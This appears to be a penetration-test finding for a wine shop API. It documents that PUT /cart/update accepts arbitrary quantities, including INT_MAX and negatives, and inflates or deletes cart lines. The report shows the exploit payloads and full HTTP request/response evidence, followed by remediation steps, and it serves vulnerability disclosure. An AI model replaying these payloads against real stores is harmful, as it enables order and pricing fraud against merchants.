# Missing Quantity Validation on PUT /cart/update Allows Arbitrary Cart Total Manipulation

**ID:** vuln-0019
**Severity:** MEDIUM
**Found:** 2026-07-20 12:12:32 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /cart/update
**Method:** PUT
**CWE:** CWE-20
**CVSS:** 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

## Description

The cart update endpoint `PUT /cart/update` at `https://api.taintedport.com` accepts arbitrary integer values in the `quantity` field, in direct violation of the domain invariant that is correctly enforced by the sibling endpoint `POST /cart/add` (`1 <= quantity <= 12`). Any authenticated user can supply values that are negative, zero, or as large as `INT_MAX` (`2147483647`); the server responds `HTTP 200 {"success":true,"message":"Cart updated"}` and the cart row is persisted with the attacker-supplied quantity. Non-positive quantities silently delete the cart row instead of producing an error.

Because item subtotals and the cart total are computed as `price * quantity`, an attacker can drive the cart total to any value between zero and roughly `5.15 × 10^11` EUR per line. A subsequent `POST /orders` will consume this cart state and create a real order at the manipulated total.

The vulnerability is a direct consequence of input validation being applied per-handler rather than in the `Cart` domain layer: the `POST /cart/add` handler contains a `Quantity must be between 1 and 12.` check that `PUT /cart/update` lacks entirely.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  Missing Quantity Validation on PUT /cart/update                     │
│  Root cause: per-handler validation; PUT handler skips the check.    │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites: authenticated user + any wine_id (from GET /wines).

  ┌───────────┐                              ┌──────────────────────┐
  │ Attacker  │                              │  api.taintedport.com │
  │ (any user)│                              │      (backend)       │
  └─────┬─────┘                              └──────────┬───────────┘
        │                                               │
   [1]  │ POST /auth/login {creds}                      │
        │──────────────────────────────────────────────►│
        │                                       200 OK  │
        │◄────────────────────────────── {token: <jwt>} │
        │                                               │
   [2]  │ POST /cart/add                                │
        │      {wine_id:3, quantity:13}                 │
        │──────────────────────────────────────────────►│  ┌─────────────────┐
        │                                               │  │ /cart/add       │
        │       400 "Quantity must be between 1..12"    │──│ validate 1..12  │
        │◄──────────────────────────────────────────────│  │ (ENFORCED)      │
        │  invariant is documented and enforced HERE    │  └─────────────────┘
        │                                               │
   [3]  │ POST /cart/add {wine_id:15, quantity:1}       │  seed a legal line
        │──────────────────────────────────────────────►│
        │                              200 Item added   │
        │◄──────────────────────────────────────────────│
        │                                               │
   [4]  │ PUT /cart/update                              │
        │      {wine_id:15, quantity:2147483647}   ◄─── bypass !
        │──────────────────────────────────────────────►│  ┌─────────────────┐
        │                                               │  │ /cart/update    │
        │                      200 "Cart updated"       │──│ (NO VALIDATION) │
        │◄──────────────────────────────────────────────│  │ writes verbatim │
        │                                               │  └────────┬────────┘
        │                                               │           │
        │                                               │           ▼
        │                                               │  cart_items.quantity
        │                                               │        = 2147483647
        │                                               │
   [5]  │ GET /cart                                     │
        │──────────────────────────────────────────────►│
        │  200 {items:[{wine_id:15, quantity:2147483647,│
        │              price:240, subtotal:515396075280}│
        │        ], total:515396075280}                 │
        │◄──────────────────────────────────────────────│
        │                                               │
        │  ── total attacker-controlled: 5.15e11 EUR ── │
        │                                               │
   [6]  │ (optional) POST /orders {shipping_address...} │  order persisted
        │──────────────────────────────────────────────►│  at manipulated total
        │                                               │

  Alternate variant — silent deletion via non-positive quantity:

        │ PUT /cart/update {wine_id:15, quantity:-3}    │
        │──────────────────────────────────────────────►│
        │              200 "Cart updated"               │  row deleted
        │◄──────────────────────────────────────────────│  (no error)

  Root cause summary
  ──────────────────
    * Domain invariant `1 <= quantity <= 12` lives in ONE handler
      (POST /cart/add) instead of the Cart domain model.
    * PUT /cart/update was written without that check and no DB-level
      CHECK constraint backstops it.
    * Fix: central validate_cart_quantity() helper + DB CHECK constraint.
```

## Impact

- Any authenticated user (no elevated privileges required) can bypass the merchant's 1..12 quantity cap and set line-item quantities to arbitrary integers.
- Order totals derived from `price * quantity` become attacker-controlled. In our reproduction, a single line reached `515,396,075,280 EUR` (~5.15 × 10^11) using wine_id=15 (Niepoort Redoma Branco, 240 EUR) and quantity=2147483647.
- Non-positive quantities silently mutate cart state (row deletion), providing an unexpected side channel that bypasses the normal `DELETE /cart/remove/{id}` path.
- Downstream systems that trust the cart/order rows — fraud thresholds, tax bands, free-shipping logic, business dashboards, inventory reservations, payment holds, and partner integrations (warehouse/fulfilment) — will operate on data that violates the merchant's own domain invariant.
- Acts as an enabling amplifier for other cart/order manipulation findings (e.g. any negative-total scenario): where a single-unit attack yields limited monetary impact, this quantity bypass scales it by up to 2^31 - 1.

## Technical Analysis

The application has two endpoints that mutate cart line quantities:

- `POST /cart/add` — validates `quantity` and returns `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}` for any value outside `[1, 12]`.
- `PUT /cart/update` — performs no comparable validation. Any integer sent in the JSON `quantity` field is accepted; the response is always `HTTP 200 {"success":true,"message":"Cart updated"}`.

Direct comparison against the same account, same session, same wine_id:

| Payload | POST /cart/add | PUT /cart/update |
|---|---|---|
| `{"wine_id":X,"quantity":13}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" |
| `{"wine_id":X,"quantity":-1}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" (row deleted) |
| `{"wine_id":X,"quantity":999}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" |
| `{"wine_id":X,"quantity":2147483647}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" (subtotal = price × 2147483647) |
| `{"wine_id":X,"quantity":0}` | 400 (missing-field validation triggers first) | 200 "Cart updated" (row deleted) |

The persisted cart is then observable via `GET /cart`:

```
{"success":true,"items":[{"wine_id":15,"quantity":2147483647,"price":240,
                          "subtotal":515396075280}],"total":515396075280}
```

Root cause is a per-handler validation pattern instead of a central `Cart::updateQuantity(qty)` domain method that raises on out-of-range values. There is no database-level `CHECK` constraint on `cart_items.quantity` to backstop the missing application-layer check either, since the row is stored verbatim.

Classification:
- CWE-20 (Improper Input Validation) — primary.
- CWE-841 (Improper Enforcement of Behavioral Workflow) — the domain rule is enforced on one workflow entry point but not another.
- CWE-682 (Incorrect Calculation) — for the resulting `subtotal`/`total` values that carry the corrupted quantity.

## Proof of Concept

Prerequisites:
- An authenticated user account (any role; regular user is sufficient). The scan used `luis.grangeia@snyk.io`.
- Knowledge of any `wine_id` (readily available from `GET /wines`).

Steps to reproduce:
1. `POST /auth/login` with valid credentials, capture the bearer token.
2. (Optional baseline) `POST /cart/add` with `{"wine_id":3,"quantity":13}` and observe `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}`. This confirms the invariant is documented and enforced elsewhere.
3. `POST /cart/add` with `{"wine_id":15,"quantity":1}` to establish a legal cart line.
4. `PUT /cart/update` with `Content-Type: application/json` and body `{"wine_id":15,"quantity":2147483647}`. Observe `HTTP 200 {"success":true,"message":"Cart updated"}`.
5. `GET /cart` and observe the response contains `"quantity":2147483647,"subtotal":515396075280,"total":515396075280`.
6. (Optional) `POST /orders` with a shipping address to persist the manipulated total as a real order (not exercised in this assessment).
7. Non-positive variant: `PUT /cart/update {"wine_id":15,"quantity":-3}` returns `HTTP 200 "Cart updated"` and `GET /cart` returns an empty items array (row silently deleted).

Reproduction was independently validated against the live target; the `poc.py` script prints per-step verification, and `verify.py` returns exit code 0 with a `[VULNERABLE]` verdict.

```
See poc/poc.py — passed via poc_script_path.
```

## Evidence

### 1. Authenticate as regular user (obtain bearer token)

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"<redacted>"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"<jwt>"}
```

> Baseline authentication. Any user role can reach the vulnerable endpoint.

### 2. Baseline: POST /cart/add correctly enforces 1..12

**Request:**
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":3,"quantity":13}
```

**Response:**
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"success":false,"message":"Quantity must be between 1 and 12."}
```

> The domain invariant IS enforced on /cart/add. Same message returned for qty=-1, 999, etc.

### 3. Seed a legal cart line (wine_id=15 Niepoort Redoma, price=240)

**Request:**
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":1}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Item added to cart"}
```

> Prerequisite: an existing cart line to update. Any legal add works.

### 4. PUT /cart/update accepts INT_MAX quantity - invariant bypassed

**Request:**
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":2147483647}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```

> Same wine_id, same session, same account - /cart/update returns 200 for a quantity /cart/add rejects with 400. No range check on this handler.

### 5. GET /cart shows the inflated total is server-persisted

**Request:**
```http
GET /cart HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"items":[{"id":381,"wine_id":15,"wine_name":"Niepoort Redoma Branco","price":240,"quantity":2147483647,"subtotal":515396075280}],"total":515396075280}
```

> Cart total is 515,396,075,280 EUR (~5.15 x 10^11) from a single line. POST /orders would consume this cart state to create a real order.

### 6. Non-positive quantities silently delete the cart row

**Request:**
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":-3}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```

> Server responds Cart updated, but GET /cart shows empty items - the row was deleted rather than an error being returned. Zero exhibits identical behaviour.


## Remediation

1. Apply the same `1 <= quantity <= 12` validation in the `PUT /cart/update` handler as in `POST /cart/add`. Return `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}` for out-of-range values so behaviour is consistent between the two endpoints.
2. Extract the quantity validation into a single shared helper (e.g. `validate_cart_quantity(qty)`) or move it into the `Cart` domain model (`Cart::updateQuantity(qty)` raising `InvalidArgumentException` for non-positive or `>12` values). Call the helper from every handler that mutates cart quantities, including any future admin/import flows.
3. Add a `CHECK (quantity BETWEEN 1 AND 12)` constraint on the `cart_items.quantity` column (and equivalent on `order_items.quantity`) as a defense-in-depth backstop against future handlers regressing.
4. Reject the case `quantity == 0` and `quantity < 0` explicitly on `PUT /cart/update`. If a "remove item" affordance is desired, require callers to use `DELETE /cart/remove/{wine_id}` — do not overload `PUT /cart/update` with silent row-deletion semantics.
5. Add integration tests that exercise `POST /cart/add`, `PUT /cart/update`, and any bulk-import endpoints against the same invalid-quantity matrix (`13`, `0`, `-1`, `-5`, `99999`, `2147483647`) and assert `HTTP 400` from all of them.
6. Audit related domain endpoints (`/cart/*`, `/orders/*`) for the same pattern: per-handler validation of a shared invariant is a known anti-pattern; ensure other cart/order fields (unit price, coupon amounts, shipping, tax rate, etc.) are validated centrally.

## Conditions for Severity Increase

- If downstream systems (payment processor, warehouse/fulfilment API, tax engine, credit-card holds, accounting ledger) act on cart/order totals without their own bounds checks, integrity impact rises to H and the finding takes on availability implications (e.g. inventory exhaustion via absurd reservation quantities), pushing CVSS towards High.
- If chained with a negative-price or negative-total finding on the same cart/order pipeline, the amplifier turns a bounded monetary loss into an effectively unlimited one — impact should be re-scored as part of the chain.
- If any admin/dashboard or reporting layer reads `subtotal`/`total` into a fixed-width integer or a currency-formatted view, the huge values may trigger integer overflow / arithmetic errors elsewhere in the platform (denial-of-view or corrupted reports), justifying an A:L or A:H uplift.
- If the endpoint is reachable without authentication in any environment (staging, mobile API surface, tenant sub-app), PR drops to N and CVSS rises to 5.3+.
